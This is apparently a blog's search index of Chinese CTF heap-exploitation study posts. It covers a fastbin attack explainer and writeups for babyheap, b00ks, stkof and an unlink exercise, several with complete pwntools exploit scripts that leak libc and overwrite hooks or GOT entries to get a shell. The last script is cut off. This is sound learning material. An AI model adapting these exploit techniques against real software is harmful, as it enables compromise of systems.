<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[堆利用学习之fastbin attack]]></title>
    <url>%2Fpost%2F531412d5.html</url>
    <content type="text"><![CDATA[原理fastbin attack是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。主要利用了fast bin的单链表管理机制。 相关源码：malloc：123456789101112131415161718/* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) &#123; // 得到对应的fastbin的下标 idx = fastbin_index(nb); // 得到对应的fastbin的头指针 mfastbinptr *fb = &amp;fastbin(av, idx); mchunkptr pp = *fb; // 利用fd遍历对应的bin内是否有空闲的chunk块， do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim); ... 这里首先根据所需chunk的大小获得该chunk所属fast bin的index，根据该index获得所需fast bin的空闲chunk链表指针，然后将头指针的下一个chunk（victim-&gt;fd）作为空闲chunk链表的头部（取出头部的chunk）。这里catomic_compare_and_exchange_val_acq是使用了lock-free的技术实现单向链表删除第一个node的操作，暂时不必关注。可以注意到，这里是通过fd指针来获取下一个chunk的。所以如果可以控制某个fast bin中chunk的fd指针的值，那么在取出这个chunk后，fd指针指向的内存将会作为下一个将要被取出的内存，再次申请这个大小的内存，也就实现了在任意地方分配chunk的目的。 但是这里需要绕过一个检查:12345678910111213// 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; ...&#125; malloc会检查取到的chunk的size是否是符合这个fast bin的，若是不符合则会GG。所以想要在任意地方分配一个chunk，需要先想办法在此处构造合适的size来通过这个检查。巧妙的是，因为此处没有对内存进行对齐检查，所以可以通过错位的方式来构造出一个假的size出来（详见文末相关题目） 利用前提 存在堆溢出、UAF等可以控制堆块内容（fd指针）的漏洞 漏洞发生于fast chunk 可以在目标位置构造出合适的size来绕过检查 利用过程 在想要分配的目标内存附近找到或者利用错位构造一个合适的size，用于绕过检查 释放掉victim（fast chunk） 通过从上一个chunk溢出或UAf等方式修改victim的fd指针，使fd指针指向构造好size的目标chunk 通过两次分配，得到目标chunk 题目 0CTF 2017 babyheap]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf2017-babyheap writeup]]></title>
    <url>%2Fpost%2F47331c36.html</url>
    <content type="text"><![CDATA[题目描述题目来源：0CTF 2017知识点：fastbin attack，chunk overlap题目是一个内存管理系统，能增删查改。 1234567===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 题目是64位程序，开启保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/0ctf2017_babyheap/0ctfbabyheap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 程序概况Allocate函数：12345678910111213141516171819202122232425262728void __fastcall Allocate(__int64 a1)&#123; signed int i; // [rsp+10h] [rbp-10h] signed int v2; // [rsp+14h] [rbp-Ch] void *v3; // [rsp+18h] [rbp-8h] for ( i = 0; i &lt;= 15; ++i ) &#123; if ( !*(_DWORD *)(24LL * i + a1) ) &#123; printf("Size: "); v2 = get_num(); if ( v2 &gt; 0 ) &#123; if ( v2 &gt; 4096 ) v2 = 4096; v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_DWORD *)(24LL * i + a1) = 1; *(_QWORD *)(a1 + 24LL * i + 8) = v2; *(_QWORD *)(a1 + 24LL * i + 16) = v3; printf("Allocate Index %d\n", (unsigned int)i); &#125; return; &#125; &#125;&#125; 限制chunk最大为4096，使用calloc意味着分配时会将chunk中的内容清0。最后将数据存入结构体1234500000000 chunk struc ; (sizeof=0x18, mappedto_6)00000000 inuse dq ?00000008 length dq ?00000010 ptr dq ?00000018 chunk ends Fill函数：1234567891011121314151617181920212223242526__int64 __fastcall Fill(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf("Index: "); result = get_num(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf("Size: "); result = get_num(); v3 = result; if ( (signed int)result &gt; 0 ) &#123; printf("Content: "); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125; 发现此处没有对size进行限制，存在溢出。并且，sub_11B2这个读取字符串的函数没有在字符串末尾加上&#39;\x00&#39; Free函数中将堆块释放，并将指针清0，没有什么问题。 dump函数将指定索引的堆块内容输出 漏洞分析泄露libc基址（chunk overlap）因为在small bin中只有一个chunk时，这个chunk的fd和bk将指向libc中某个地址（&amp;main_arena+88）,所以只要能够输出fd或者bk，就能泄露出libc的基址。123456780x555555757000 PREV_INUSE &#123; prev_size = 0, size = 209, fd = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, &lt;== libc中的地址 bk = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 问题的关键转移到如何输出fd和bk。因为存在堆溢出，那么可以通过从chunk0溢出到chunk1，修改chunk1的size，使size变大从而造成overlap，让chunk2的头部包含在chunk1中，然后就可以通过打印chunk1来泄露libc了 fastbin attack先将chunk1释放，通过从chunk0溢出到chunk1的fd，通过控制chunk1的fd，则可以在几乎任意地方分配chunk。因为程序开启PIE和RELRO，所以没办法利用got表，则考虑malloc_hook或者free_hook等。这里需要考虑一个问题，在从fast bin分配chunk时，会检查取到的chunk大小是否与相应的fastbin索引一致（源码如下），也就是说若要在某个地方分配chunk，需要先在这个地方构造好size，使这个size恰好属于chunk所在的fastbin。1234567891011 // 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; 巧妙的是，在malloc_hook的前面，有类似这样的数据:1230x7ffff7dd3720 &lt;__memalign_hook&gt;: 0x00007ffff7a94fc0 0x00000000000000000x7ffff7dd3730 &lt;__realloc_hook&gt;: 0x00007ffff7a94f60 0x00000000000000000x7ffff7dd3740 &lt;__malloc_hook&gt;: 0x00007ffff7a94f20 0x0000000000000000 又因为这里并没有对齐检测，所以可以通过利用没有对齐的数据来通过检测。通过截取上面数据的7f，和后面的00拼在一起，变成:1230x7ffff7dd371d: 0xfff7a94fc0000000 0x000000000000007f0x7ffff7dd372d: 0xfff7a94f60000000 0x000000000000007f0x7ffff7dd373d: 0xfff7a94f20000000 0x000000000000007f 这样就构造出了一个size为0x7f的chunk。这样就可以在这分配一个大小为0x7f的chunk，然后从这写入，覆盖一定的无效数据就能到达malloc_hook的地址，然后向malloc_hook中写入one_gadget就可以getshell了。（了解one_gadget） 漏洞利用 分配两个chunk,大小分别为0x60和0x40（第二个chunk较小是为了之后能够改大，而又不超过fastbin限制） 从chunk0溢出到chunk1的size，将其改成0x70，使chunk1覆盖的范围变大。但此时还并没有真正变大，要释放后重新分配出来才能生效。 再分配两个chunk，chunk2需要是small chunk，chunk3是用来隔开top chunk，防止释放chunk2时被top chunk合并。因为在free的时候会检查下一个chunk的size是否大于2*size_sz并且小于system_mem（源码如下），所以还要在chunk2中构造一个fake size 12345678910// 下一个chunk的大小nextsize = chunksize(nextchunk);// next chunk size valid check// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者// nextsize是否大于系统可提供的内存if (__builtin_expect(chunksize_nomask(nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = "free(): invalid next size (normal)"; goto errout;&#125; 将chunk1释放，并重新分配一个大小0x60的chunk，这里chunk1被取回并成功扩大。 因为使用的calloc会初始化内存，所以还需要恢复一下chunk2的前20个字节 释放chunk2，chunk2进入small bin 打印chunk1，泄露出libc的基址 通过libc基址计算出malloc_hook的地址和one_gadget的地址 释放掉chunk1，通过溢出chunk0来修改chunk1的fd，将fd修改到malloc_hook附近 通过两次分配，得到malloc_hook附近的chunk 向malloc_hook中写入one_gadget，成功getshell exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding:utf-8 -*-from pwn import *p = process('./0ctfbabyheap')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def Allocate(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def Fill(index, content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(len(content) + 1)) p.recvuntil('Content: ') p.sendline(content)def Free(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def Dump(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: \n') data = p.recvline() return datadef leak_libc(): Allocate(0x60) #0 Allocate(0x40) #1 #从chunk0溢出，将chunk1的size改为0x71，使chunk1覆盖范围更大 payload = 'a'*0x60 + p64(0) + p64(0x71) Fill(0, payload) #分配一个0x100的smallchunk 再分配一个chunk是为了防止free smallchunk时被topchunk合并 #该smallchunk的chunkhead(0x10个字节)和fd、bk(0x10个字节)都在修改后的chunk1的数据区 #接下来要将chunk1释放掉再分配使chunk1范围真正扩大 #但释放时会检查下一个chunk的size是否大于2*size_sz且小于system_mem #所以还得构造一下next size Allocate(0x100) #2 Allocate(0x60) #3 payload = 'a'*0x10 + p64(0) + p64(0x71) Fill(2, payload) #释放chunk1并重新分配回来，因为alloc会初始化内存，所以smallchunk的前0x20个字节被清空 #恢复smallchunk的前0x20个字节 Free(1) Allocate(0x60) #1 payload = 'a'*0x40 + p64(0) + p64(0x111) Fill(1, payload) #释放smallchunk 因为当smallbin是一个双向链表 所以当其中只有一个chunk时 #该chunk的fd和bk都指向头结点 头结点存在于main_arena中 main_arena又存在于libc中 #所以fd和bk指向的是libc中的某个地址 通过固定的偏移 则可以泄露出libc_base Free(2) leaked = u64(Dump(1)[-9:-1]) - 0x3C27B8 print "libc_base : %#x" % (leaked) return leakeddef fastbin_attack(libc_base): #malloc_hook 可以在gdb中 x/32gx (long long)(&amp;main_arena)-0x40 来找到 malloc_hook = libc_base + libc.symbols['__malloc_hook'] #使用 one_gadget 找到execve('/bin/sh') execve_addr = libc_base + 0x4647c print "malloc_hook : %#x" % malloc_hook print "execve_addr : %#x" % execve_addr #释放掉chunk1 通过溢出chunk0来修改chunk1的fd #通过控制chunk1的fd 则可以在任何地方分配内存 那么我们可以控制malloc_hook #因为malloc会检查fastbin中chunk的size是否属于这个fastbin #而malloc_hook处的值为0 不能通过检查 #通过前文提到的未对齐的数据来绕过检查 #这样就可以获得一个size位为0x7f的chunk Free(1) payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 19) + p64(0) Fill(0, payload) #通过两次分配 得到malloc_hook附近的chunk Allocate(0x60) Allocate(0x60) #覆盖一定的无效数据到达malloc_hook的地址 向其中写入execve_addr payload = p8(0)*3 + p64(execve_addr) Fill(2, payload) #malloc时判断malloc_hook不为0 执行malloc_hook指向的代码 getshell Allocate(0x60)libc_base = leak_libc()fastbin_attack(libc_base)p.interactive() 相关链接题目链接：0ctf_babyheapwriteup参考：Anciety师傅的博客]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>fastbin_attack</tag>
        <tag>ctfwiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Asis2016-b00ks writeup]]></title>
    <url>%2Fpost%2Fb6745c59.html</url>
    <content type="text"><![CDATA[题目描述题目来源：Asis CTF 2016知识点：null byte off_by_one、mmap泄露libc基址题目是一个书籍管理系统，具有增删查改功能。 1234567891011nick@nick-machine:~/pwn_learn/heapLearn/off_by_one$ ./b00ks Welcome to ASISCTF book libraryEnter author name: aaaa1. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt; 题目是64位程序，开启保护情况：123456[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 程序开启了PIE，意味着难以得到程序中函数的地址，可能对泄露libc造成阻碍。 程序概况程序首先要求输入author name，调用一个处理输入的函数（input函数）123456789101112131415161718192021signed __int64 __fastcall input(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\n' ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125; 分析代码可以发现，代码对字符串末尾处理不当，会在字符串的最后加上&#39;\x00&#39;,即使字符串已经占满buf。也就是说程序中存在null byte off_by_one漏洞 create函数:输入name，对大小没有限制1234567printf("\nEnter book name size: ", *&amp;v1); __isoc99_scanf("%d", &amp;v1); if ( v1 &gt;= 0 ) &#123; printf("Enter book name (Max 32 chars): ", &amp;v1); ptr = malloc(v1); ... 输入description，同样对大小无限制12345678910111213printf("\nEnter book description size: ", *&amp;v1);__isoc99_scanf("%d", &amp;v1);if ( v1 &gt;= 0 )&#123; v5 = malloc(v1); if ( v5 ) &#123; printf("Enter book description: ", &amp;v1); if ( input(v5, v1 - 1) ) &#123; printf("Unable to read description"); &#125; ... 最后将name和description的指针存入结构体12345678910v3 = malloc(0x20uLL);if ( v3 )&#123; *(v3 + 6) = v1; *(off_202010 + v2) = v3; *(v3 + 2) = v5; *(v3 + 1) = ptr; *v3 = ++cnt; return 0LL;&#125; 分析可得到结构体12345600000000 book struc ; (sizeof=0x20, mappedto_6)00000000 index dq ?00000008 name dq ?00000010 description dq ?00000018 size dq ?00000020 book ends delete函数会将指针清零，不存在悬挂指针edit函数用于编辑book的descriptionprint函数输出ID、name、description、author，可以用来泄露信息change_name函数可以修改author name 漏洞分析任意读写由于null byte off_by_one，在程序开头时，若输入32位的author name（unk_202040），那么&#39;\x00&#39;会溢出到book_list（unk_202060）中1234.data:0000000000202010 book_list dq offset unk_202060 ; DATA XREF: sub_B24:loc_B38↑o.data:0000000000202010 ; delete:loc_C1B↑o ....data:0000000000202018 author_name dq offset unk_202040 ; DATA XREF: change_name+15↑o.data:0000000000202018 ; print+CA↑o 若是此时create一个book，那么新book的指针将会覆盖掉这个溢出的&#39;\x00&#39;，导致author name与book指针之间没有截断，意味着我可以通过输出author name来泄露出book的指针，也就是堆地址。1230x555555756040: 0x6161616161616161 0x6161616161616161 &lt;== author name0x555555756050: 0x6161616161616161 0x00616161616161610x555555756060: 0x0000555555757160 &lt;== book指针 由于程序提供修改author name的函数，所以可以再次输入32位的author name，使溢出的&#39;\x00&#39;覆盖掉book指针的最低字节，导致book的指针所指向的地址变小。10x0000555555757160 ==&gt; 0x0000555555757100 //地址变小 因为在create一个book时，会先申请name和description的空间，所以经过修改的book指针有可能就会指向地址偏小description的空间中1234567891011120x555555757000: 0x0000000000000000 0x0000000000000021 &lt;== name0x555555757010: 0x6161616161616161 0x00000000000000000x555555757020: 0x0000000000000000 0x0000000000000131 &lt;== description0x555555757030: 0x6262626262626262 0x00000000000000000x555555757040: 0x0000000000000000 0x0000000000000000 ......0x555555757100: 0x0000000000000000 0x0000000000000000 &lt;== 修改后的book指针，指向description中 ...... 0x555555757150: 0x0000000000000000 0x00000000000000310x555555757160: 0x0000000000000001 0x0000555555757010 &lt;== 修改前的book指针0x555555757170: 0x0000555555757030 0x00000000000001200x555555757180: 0x0000000000000000 0x0000000000020e81 所以可以事先在description中伪造一个book结构体，当book指针被修改于此时，就可以对伪造的name和description进行读写，实现任意读写。 泄露libc基址这道题由于开启PIE，并且没有uaf等常规方法来泄露libc，所以这里采用了一种更为巧妙的方法。在分配第二个book时，申请一个很大的空间，使堆以mmap模式进行拓展（可以参考这里）。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址123456789101112131415161718192021pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x56052bb62000 0x56052bb64000 r-xp 2000 0 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd63000 0x56052bd64000 r--p 1000 1000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd64000 0x56052bd65000 rw-p 1000 2000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052d944000 0x56052d965000 rw-p 21000 0 [heap] 0x7fd6affa0000 0x7fd6b015e000 r-xp 1be000 0 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b015e000 0x7fd6b035e000 ---p 200000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b035e000 0x7fd6b0362000 r--p 4000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0362000 0x7fd6b0364000 rw-p 2000 1c2000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0364000 0x7fd6b0369000 rw-p 5000 0 0x7fd6b0369000 0x7fd6b038c000 r-xp 23000 0 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b054d000 0x7fd6b0572000 rw-p 25000 0 &lt;==== mmap分配的空间 0x7fd6b058a000 0x7fd6b058b000 rw-p 1000 0 0x7fd6b058b000 0x7fd6b058c000 r--p 1000 22000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058c000 0x7fd6b058d000 rw-p 1000 23000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058d000 0x7fd6b058e000 rw-p 1000 0 0x7ffe6b361000 0x7ffe6b382000 rw-p 21000 0 [stack] 0x7ffe6b3bd000 0x7ffe6b3bf000 r--p 2000 0 [vvar] 0x7ffe6b3bf000 0x7ffe6b3c1000 r-xp 2000 0 [vdso]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall] getshell因为PIE，所以很难采用覆写got表等方法。而已经泄露了libc，所以这里采用向__free_hook写入system来getshell 漏洞利用 输入32位的author name，create一个book1（name：0x20字节，description：0x120字节） 调用show函数 泄露堆地址 create book2（description为大空间：0x21000字节），准备泄露libc基址 create book3（name写入&#39;/bin/sh\x00&#39;）为getshell做准备 在book1-&gt;description中伪造book结构体，name指针为book2的description指针（即mmap分配空间的地址），description指针为book3中description指针的地址。（这里地址都可以由泄露的堆地址加上偏移得到） 重新向author name中写入32个字节，使&#39;\x00&#39;覆盖掉book1指针的最低位字节，book1指针指向book1-&gt;description中布置好的book结构体 调用show函数，通过book1的name的值得到mmap分配的地址，减去固定的偏移获得libc基址 通过libc基址，计算出system和__free_hook的地址 调用edit，修改book1的description，写入free_hook的地址，因为第（5）步，所以这里实际是将book3的description指针改为free_hook的地址 调用edit，修改book3的description，写入system，因为第（9）步，所以这里实际是把system写入__free_hook中 调用delete(book3)，因为事先在name写入的&#39;/bin/sh\x00&#39;，所以成功getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#-*- coding=utf-8 -*-from pwn import *context.log_level = 'debug'p = process('b00ks')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def create(name, description): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Enter book name size: ') p.sendline(str(len(name))) p.recvuntil('Enter book name (Max 32 chars): ') p.send(name) p.recvuntil('Enter book description size: ') p.sendline(str(len(description))) p.recvuntil('Enter book description: ') p.send(description)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('id you want to delete: ') p.sendline(str(index))def edit(index, description): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('id you want to edit: ') p.sendline(str(index)) p.recvuntil('new book description: ') p.sendline(description)def show(): p.recvuntil('&gt; ') p.sendline('4')def change_name(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('Enter author name: ') p.sendline(name)def leak(addr1, addr2): payload = 'b'*0xc0 + p64(1) + p64(addr1) + p64(addr2) + p64(0x120) edit(1, payload) change_name('a'*32) show() p.recvuntil('Name: ') res = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) return res#泄露堆地址p.recvuntil('Enter author name: ')p.sendline('a'*32)create('a'*0x20, 'b'*0x120)show()p.recvuntil('Author: ')heap_addr = u64(p.recvuntil('\n')[32:-1].ljust(8, '\x00'))print "heap_addr: %#x" % heap_addr#申请一个大内存，让堆以mmap模式进行拓展，进而泄露libc_basecreate('a'*0x20, '\x00'*0x21000)create('/bin/sh\x00', 'b'*0x8)#heap_addr+0x70是以mmap拓展的堆的地址，将他写入伪造的book结构体的name中，准备泄露该值#heap_addr_0xe0是chunk3的description指针，为之后任意写做准备libc_base = leak(heap_addr+0x70, heap_addr+0xe0) - 0x5AD010 #该值需要根据系统修改print "libc_base: %#x" % libc_base#计算地址system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']print "system: %#x" % systemprint "free_hook: %#x" % free_hook#之前将chunk3的description指针的地址写到了伪造chunk的description指针处，所以这里将改写chunk3的description指针的值为free_hook#因为off_one_byte会导致写入时会多往后覆盖一个字节，导致后方的book-&gt;size被覆盖为0，所以这里手动多写一个字节'\x08'，以免size被覆盖为0edit(1, p64(free_hook)+'\x08')#向free_hook中写入systemedit(3, p64(system))#事先已经在chunk3的name中放入了/bin/sh\x00delete(3)p.interactive() 相关链接题目链接：b00ks]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>ctfwiki</tag>
        <tag>off_by_one</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitcon2014-stkof writeup]]></title>
    <url>%2Fpost%2Fe7616071.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2014知识点：unlink这道题没有菜单显示，只能通过分析代码来了解程序功能。 功能： 添加（输入：长度） 修改（输入：索引、长度、内容） 删除（输入：索引） 程序保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 程序分析add函数中，对分配chunk的大小没有限制，将指针存到全局数组中，可获得指针变量的地址 set函数中，12345678910111213141516171819202122232425262728293031signed __int64 set()&#123; signed __int64 result; // rax int i; // eax unsigned int v2; // [rsp+8h] [rbp-88h] __int64 n; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v2 = atol(&amp;s); if ( v2 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v2] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); n = atoll(&amp;s); ptr = ::s[v2]; for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; if ( n ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125; 对写入的长度没有限制，存在堆溢出，所以可以利用unlink漏洞 delete函数中，释放掉堆块并把指针清零0 由于程序中没有可以用来输出数据的函数，于是考虑将puts函数覆写到其他函数的got表（这里选择free函数） 漏洞利用 分配连续4个chunk（编号1-4），大小为0x80（smallchunk）（通常尽量多申请一个chunk，以隔开top chunk，防止被合并） 在chunk1中构造fake chunk，准备unlinkprevsize：0size：0x80fd：chunk_ptr - 0x18bk：chunk_ptr - 0x10注意：chunk_ptr是指向chunk0的指针变量所在的地址，而非指针指向的地址 从chunk1继续溢出到chunk2，修改prevsize、size（inuse位）prevsize: 0x80size：0x90 释放chunk2，触发unlink，此后chunk1的指针的值被修改为了chunk_ptr-0x18 把free的got表修改为puts。payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts)) 使用DynELF泄露system（详见代码） 利用（5）的方法，再将free的got表修改为system 向chunk3中写入/bin/sh\x00，释放chunk3，getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./stkof')elf = ELF('./stkof')free_got = elf.got['free']puts = elf.symbols['puts']def add(size): p.sendline('1') p.sendline(str(size)) p.recvuntil('OK\n')def set(index, content): p.sendline('2') p.sendline(str(index)) p.sendline(str(len(content))) p.send(content) p.recvuntil('\n')def delete(index): p.sendline('3') p.sendline(str(index))def leak(addr): payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(addr) set(1, payload) delete(2) res = p.recvuntil('OK\n').split('\x0aOK')[0] if res == '': res = '\x00' return res #返回值可以为任意长度，并不清楚原因chunk_ptr = 0x602148add(0x80)add(0x80)add(0x80)add(0x80)#unlinkpayload = p64(0) + p64(0x0)payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)payload += 'a' * 0x60payload += p64(0x80) + p64(0x90)set(1, payload)delete(2)p.recvuntil('OK\n')#freegot写为putspayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))#leakd = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#freegot写为systempayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(system))#getshellset(3, '/bin/sh\x00')delete(3)p.interactive() 相关链接题目链接：stkof相关题目：unlink例题unlink漏洞分析：堆利用学习之unlink]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink例题]]></title>
    <url>%2Fpost%2F503970b4.html</url>
    <content type="text"><![CDATA[题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。知识点：unlink 123456nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap1.Add chunk2.Set chunk3.Delete chunk4.Print chunk5.Exit 程序分析其中，add函数没有对申请的chunk大小做限制。在set函数中：123456789101112ssize_t set()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, "Set chunk index:", 0x10u); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 ) return write(1, "Set chunk data error!\n", 0x16u); write(1, "Set chunk data:", 15u); return read(0, buf[v1], 0x400u);&#125; 可以发现代码中没有对写入的长度做限制，存在溢出同时，buf[]中储存指向chunk的指针，且为全局变量，可以获得地址由此确定程序中存在unlink漏洞 在delete函数中：123456789101112void delete()&#123; int v0; // [esp+Ch] [ebp-Ch] v0 = -1; write(1, "Delete chunk index:", 0x13u); __isoc99_scanf("%d", &amp;v0); if ( v0 &gt;= 0 ) free(buf[v0]); else write(1, "Delete chunk error!\n", 0x14u);&#125; 释放chunk后没有对指针赋0，会造成UAF漏洞，但此题不会利用到。 在print函数中，可输出任意index的chunk，用于泄露数据。 由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读 漏洞利用 分配3个连续的chunk，大小为0x80（smallchunk）chunk0、chunk1: 用于构造unlinkchunk2：用于防止被top chunk合并 在chunk0中构造fake chunk，准备unlink。prevsize：0size：0x80fd：chunk_ptr - 0xcbk：chunk_ptr - 0x8注意：chunk_ptr是指向chunk0的指针变量所在的地址，即&amp;buf[0]，而非指针指向的地址 从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）prevsize: 0x80size：0x88 释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc 写入chunk0，构造leak函数，准备利用DynELF来泄露system，由于指针被修改，实际写入地址是chunk_ptr-0xc。payload = &#39;a&#39; * 0xc //paddingpayload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用payload += p32(addr) //将addr写入chunk1的指针(buf[1])此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取 利用DynELF泄露出system函数地址 利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将system的地址写入free的got表 向chunk2中写入&#39;/bin/sh\x00&#39;，调用free(chunk2)，因为free被覆盖为system，所以实际调用system(chunk2)，成功getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *elf = ELF('heap')free_got = elf.got['free']chunk_ptr = 0x8049d60#p = process('heap')p = remote('127.0.0.1', 4000)def add_chunk(size): p.recvuntil('5.Exit\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') 